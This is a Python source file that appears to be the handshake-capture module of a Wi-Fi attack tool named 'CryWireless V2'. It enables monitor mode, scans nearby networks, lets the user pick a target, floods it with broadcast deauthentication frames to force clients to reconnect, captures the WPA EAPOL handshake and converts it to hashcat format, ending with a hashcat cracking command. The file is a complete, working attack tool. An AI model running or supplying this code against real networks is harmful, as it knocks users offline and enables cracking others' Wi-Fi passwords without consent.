# handshake_module.py
import os
import sys
import re
import time
import signal
import threading
import subprocess
from scapy.all import *

parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

from debugs import debug

LCD_AVAILABLE = False
try:
    from core.LCD_Module import display_message, clear_display
    LCD_AVAILABLE = True
except ImportError:
    try:
        from LCD_Module import display_message, clear_display
        LCD_AVAILABLE = True
    except ImportError:
        display_message = lambda msg, row, duration=None: None
        clear_display = lambda: None

class HandshakeCaptureModule:
    def __init__(self):
        self.networks = {}
        self.stop_sniff = False
        self.scan_threads = []
        self.monitor_mode_enabled = False
        self.original_interface = None
        self.interface = None
        self.handshake_packets = []
        self.target_bssid = None
        self.eapol_count = 0
        self.beacon_captured = False
        
    def cleanup_monitor_mode(self):
        if not self.monitor_mode_enabled:
            return
        
        debug("info", "Cleaning up monitor mode...")
        try:
            if self.interface:
                subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True, timeout=5)
                subprocess.run(["iw", "dev", self.interface, "set", "type", "managed"], capture_output=True, timeout=5)
                subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True, timeout=5)
            
            nm_status = subprocess.run(["systemctl", "is-active", "NetworkManager"], capture_output=True, text=True)
            if nm_status.stdout.strip() != "active":
                os.system("systemctl start NetworkManager > /dev/null 2>&1")
            
            self.monitor_mode_enabled = False
            debug("ok", "Monitor mode disabled")
        except Exception as e:
            debug("critical", f"Cleanup failed: {e}")

    def enable_monitor_mode(self, interface):
        debug("info", f"Enabling monitor mode on {interface}...")
        
        try:
            result = subprocess.run(["iwconfig", interface], capture_output=True, text=True, timeout=5)
            
            if "Mode:Monitor" in result.stdout:
                debug("ok", f"{interface} already in monitor mode")
                self.monitor_mode_enabled = True
                return interface
            
            self.original_interface = interface.replace("mon", "")
            
            result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True, timeout=10)
            
            if "monitor mode enabled" in result.stdout.lower() or "enabled on" in result.stdout.lower():
                match = re.search(r'(\w+mon\w*)', result.stdout)
                if match:
                    mon_interface = match.group(1)
                    debug("ok", f"Monitor mode enabled on {mon_interface}")
                    self.monitor_mode_enabled = True
                    return mon_interface
                else:
                    possible_names = [f"{interface}mon", f"{interface}", "wlan0mon", "wlan1mon"]
                    for name in possible_names:
                        check = subprocess.run(["ifconfig", name], capture_output=True)
                        if check.returncode == 0:
                            debug("ok", f"Monitor mode enabled on {name}")
                            self.monitor_mode_enabled = True
                            return name
            
            debug("warn", "Could not confirm monitor mode, trying anyway...")
            self.monitor_mode_enabled = True
            return interface
            
        except Exception as e:
            debug("critical", f"Monitor mode failed: {e}")
            return interface

    def signal_handler(self, sig, frame):
        self.stop_sniff = True
        debug("warn", "Stopping scan...")

    def packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            raw_bssid = pkt[Dot11].addr2
            if not raw_bssid:
                return
            bssid = raw_bssid.upper()
            ssid = pkt[Dot11Elt].info.decode(errors="ignore")

            channel = None
            dsset = pkt.getlayer(Dot11Elt, ID=3)
            if dsset:
                try:
                    channel = dsset.info[0]
                except Exception:
                    pass

            if bssid not in self.networks:
                self.networks[bssid] = {"ssid": ssid, "channel": channel}
                print(f"{ssid or '<Hidden>'} - {bssid} (Ch {channel or '?'})")

    def eapol_handler(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                if pkt.haslayer(Dot11):
                    bssid = pkt[Dot11].addr3
                    if bssid and bssid.upper() == self.target_bssid:
                        if not self.beacon_captured:
                            self.handshake_packets.append(pkt)
                            self.beacon_captured = True
                            debug("ok", "Beacon/Probe frame captured")
            
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                addr1 = pkt[Dot11].addr1
                addr2 = pkt[Dot11].addr2
                addr3 = pkt[Dot11].addr3
                
                if addr3 and addr3.upper() == self.target_bssid:
                    self.handshake_packets.append(pkt)
                    self.eapol_count += 1
                    
                    client = addr2 if addr1.upper() == self.target_bssid else addr1
                    debug("ok", f"EAPOL packet {self.eapol_count}/4 captured from {client.upper()[:8]}...")
                    
                    if LCD_AVAILABLE:
                        clear_display()
                        display_message("EAPOL Captured", 0)
                        display_message(f"   {self.eapol_count}/4 packets ", 1)
                    
                    if self.eapol_count >= 4:
                        self.stop_sniff = True
        except Exception as e:
            pass

    def set_channel(self, channel):
        try:
            subprocess.run(["iw", "dev", self.interface, "set", "channel", str(channel)], capture_output=True, timeout=2, check=False)
        except Exception:
            pass

    def scan_worker(self):
        debug("info", f"Scan worker started on {self.interface}")
        packet_count = 0
        
        while not self.stop_sniff:
            try:
                sniff(iface=self.interface, prn=self.packet_handler, timeout=2, store=False)
                packet_count += 1
                
                if packet_count % 10 == 0 and len(self.networks) > 0:
                    debug("info", f"Scanning... {len(self.networks)} networks found")
                    
            except ValueError as e:
                debug("critical", f"Interface error: {e}")
                break
            except PermissionError:
                debug("critical", "Permission denied. Run with sudo")
                break
            except OSError as e:
                debug("critical", f"OS Error: {e}")
                break
            except Exception as e:
                debug("error", f"Scan error: {e}")
                time.sleep(1)
        
        debug("info", "Scan worker stopped")

    def channel_hopper(self, channels, delay):
        debug("info", f"Channel hopper started")
        
        while not self.stop_sniff:
            for ch in channels:
                if self.stop_sniff:
                    break
                self.set_channel(ch)
                time.sleep(delay)

    def start_channel_hop_scan(self):
        self.stop_sniff = False
        self.scan_threads = []
        
        if LCD_AVAILABLE:
            clear_display()
            display_message("  Scanning... ", 0)
            display_message(" Dual Band Mode ", 1)
        
        channels_24 = list(range(1, 14))
        channels_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
        channels = channels_24 + channels_5

        t_hopper = threading.Thread(target=self.channel_hopper, args=(channels, 0.3))
        t_sniff = threading.Thread(target=self.scan_worker)
        self.scan_threads.extend([t_hopper, t_sniff])

        for t in self.scan_threads:
            t.daemon = True
            t.start()

        time.sleep(1)
        debug("ok", "Scanning in progress...")

        while not self.stop_sniff:
            time.sleep(0.1)

        for t in self.scan_threads:
            t.join(timeout=3)

    def send_deauth_continuous(self, bssid, channel):
        debug("info", "Starting continuous deauth...")
        if LCD_AVAILABLE:
            clear_display()
            display_message("Continuous", 0)
            display_message("   Deauth... ", 1)
        
        self.set_channel(channel)
        time.sleep(0.5)
        
        try:
            broadcast = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
            broadcast_packet = RadioTap()/broadcast/Dot11Deauth(reason=7)
            
            start_time = time.time()
            deauth_count = 0
            
            while not self.stop_sniff:
                if time.time() - start_time > 30:
                    debug("warn", "Deauth timeout (30s)")
                    break
                
                sendp(broadcast_packet, iface=self.interface, count=5, inter=0.1, verbose=0)
                deauth_count += 5
                
                if deauth_count % 20 == 0:
                    debug("info", f"Sent {deauth_count} deauth packets...")
                
                time.sleep(0.5)
            
            debug("ok", f"Deauth stopped (sent {deauth_count} packets)")
        except Exception as e:
            debug("error", f"Deauth failed: {e}")

    def capture_handshake(self, bssid, channel):
        debug("info", "Starting handshake capture...")
        debug("info", "Listening for EAPOL packets...")
        if LCD_AVAILABLE:
            clear_display()
            display_message("Capturing HSK", 0)
            display_message("  Listening... ", 1)
        
        self.target_bssid = bssid
        self.handshake_packets = []
        self.eapol_count = 0
        self.beacon_captured = False
        self.stop_sniff = False
        
        self.set_channel(channel)
        time.sleep(1)
        
        deauth_thread = threading.Thread(target=self.send_deauth_continuous, args=(bssid, channel))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        debug("info", "Deauth running in background (30s timeout)")
        debug("info", "Press Ctrl+C to stop early")
        
        start_time = time.time()
        capture_timeout = 30
        
        try:
            while not self.stop_sniff and self.eapol_count < 4:
                if time.time() - start_time > capture_timeout:
                    debug("warn", "Capture timeout (30s)")
                    break
                
                try:
                    sniff(
                        iface=self.interface,
                        prn=self.eapol_handler,
                        timeout=2,
                        store=False
                    )
                except Exception as e:
                    debug("error", f"Sniff error: {e}")
                    time.sleep(0.5)
                    
        except KeyboardInterrupt:
            debug("warn", "Capture interrupted by user")
            self.stop_sniff = True
        except Exception as e:
            debug("error", f"Capture error: {e}")
        
        self.stop_sniff = True
        time.sleep(1)
        
        if not self.beacon_captured:
            debug("warn", "No Beacon/Probe frame captured, trying to get one...")
            try:
                sniff(
                    iface=self.interface,
                    prn=self.eapol_handler,
                    timeout=3,
                    store=False
                )
            except Exception:
                pass
        
        if self.eapol_count >= 4 and self.beacon_captured:
            debug("ok", "Full handshake captured with Beacon!")
            if LCD_AVAILABLE:
                clear_display()
                display_message("HSK Captured!", 0)
                display_message("   Complete!   ", 1)
                time.sleep(2)
            return True
        elif self.eapol_count >= 4 and not self.beacon_captured:
            debug("warn", "EAPOL captured but missing Beacon frame")
            debug("info", "Handshake may not convert properly")
            if LCD_AVAILABLE:
                clear_display()
                display_message("HSK Incomplete", 0)
                display_message(" No Beacon!  ", 1)
                time.sleep(2)
            return False
        elif self.eapol_count > 0:
            debug("warn", f"Only captured {self.eapol_count}/4 EAPOL packets")
            debug("info", "Try again or move closer to the AP")
            if LCD_AVAILABLE:
                clear_display()
                display_message("HSK Incomplete", 0)
                display_message(f"   {self.eapol_count}/4 pkts   ", 1)
                time.sleep(2)
            return False
        else:
            debug("error", "No EAPOL packets captured")
            debug("info", "Check if clients are connected or try a different network")
            if LCD_AVAILABLE:
                clear_display()
                display_message("  No EAPOL   ", 0)
                display_message("   Captured   ", 1)
                time.sleep(2)
            return False

    def packets_to_hashcat(self, ssid, bssid):
        try:
            if LCD_AVAILABLE:
                clear_display()
                display_message("Converting to", 0)
                display_message("Hashcat Format", 1)
            
            temp_cap = "/tmp/handshake_temp.cap"
            wrpcap(temp_cap, self.handshake_packets)
            
            result = subprocess.run(
                ["hcxpcapngtool", "-o", "/tmp/handshake.hc22000", temp_cap],
                capture_output=True,
                text=True
            )
            
            if os.path.exists("/tmp/handshake.hc22000"):
                with open("/tmp/handshake.hc22000", "r") as f:
                    hashcat_string = f.read().strip()
                
                os.remove("/tmp/handshake.hc22000")
                os.remove(temp_cap)
                
                if LCD_AVAILABLE:
                    display_message("Conversion", 0)
                    display_message("  Success!   ", 1)
                    time.sleep(2)
                
                return hashcat_string
            else:
                debug("error", "Failed to convert to hashcat format")
                if LCD_AVAILABLE:
                    display_message("Conversion", 0)
                    display_message("   Failed!   ", 1)
                    time.sleep(2)
                return None
                
        except Exception as e:
            debug("error", f"Conversion error: {e}")
            if LCD_AVAILABLE:
                display_message("Conversion Err", 0)
                display_message("  Check Log   ", 1)
                time.sleep(2)
            return None

    def run(self):
        try:
            signal.signal(signal.SIGINT, self.signal_handler)
            
            self.interface = input("Which WiFi interface to use: ")
            
            original_interface = self.interface
            self.enable_monitor_mode(self.interface)
            self.interface = original_interface
            
            debug("info", "Scanning for networks (DUAL BAND)...")
            debug("info", "Press Ctrl+C to stop scanning")
            
            self.start_channel_hop_scan()
            if not self.networks:
                debug("critical", "No networks found")
                if LCD_AVAILABLE:
                    display_message(" No Networks ", 0)
                    display_message("    Found!    ", 1)
                    time.sleep(2)
                return
            
            if LCD_AVAILABLE:
                clear_display()
                display_message(f"{len(self.networks)} Networks", 0)
                display_message("     Found!    ", 1)
                time.sleep(2)
            
            print("\nNetworks found:")
            for i, (bssid, info) in enumerate(self.networks.items(), 1):
                ssid = info["ssid"] or "<Hidden>"
                ch = info["channel"] or "?"
                print(f"{i}) {ssid} - {bssid} (Ch {ch})")

            pick = int(input("\nPick a network number: "))
            chosen_bssid = list(self.networks.keys())[pick - 1]
            chosen_info = self.networks[chosen_bssid]
            chosen_ssid = chosen_info["ssid"]
            chosen_channel = chosen_info["channel"]

            debug("ok", f"Target: {chosen_ssid or '<Hidden>'} ({chosen_bssid})")
            debug("info", f"Channel: {chosen_channel}")
            
            if LCD_AVAILABLE:
                clear_display()
                ssid_display = (chosen_ssid or "Hidden")[:16]
                display_message(ssid_display.center(16), 0)
                display_message(f"Ch:{chosen_channel}".center(16), 1)
                time.sleep(3)
            
            if self.capture_handshake(chosen_bssid, chosen_channel):
                hashcat_string = self.packets_to_hashcat(chosen_ssid, chosen_bssid)
                
                if hashcat_string:
                    print("\n" + "="*60)
                    print("HASHCAT READY FORMAT (WPA*22000)")
                    print("="*60)
                    print(hashcat_string)
                    print("="*60)
                    
                    save = input("\nSave to file? (y/n): ")
                    if save.lower() in ["y", "yes"]:
                        filename = input("Filename (default: handshake.hc22000): ").strip() or "handshake.hc22000"
                        with open(filename, "w") as f:
                            f.write(hashcat_string)
                        debug("ok", f"Saved to {filename}")
                        debug("info", f"Crack with: hashcat -m 22000 {filename} wordlist.txt")
                else:
                    debug("critical", "Failed to generate hashcat format")
            else:
                debug("critical", "Handshake capture failed")
        
        except KeyboardInterrupt:
            debug("warn", "Interrupted by user")
        except Exception as e:
            debug("critical", f"Fatal error: {e}")
        finally:
            self.cleanup_monitor_mode()
            debug("ok", "Handshake module cleanup complete")


if __name__ == "__main__":
    debug("info", "CryWireless V2 - Handshake Capture Module")
    capture = HandshakeCaptureModule()
    capture.run()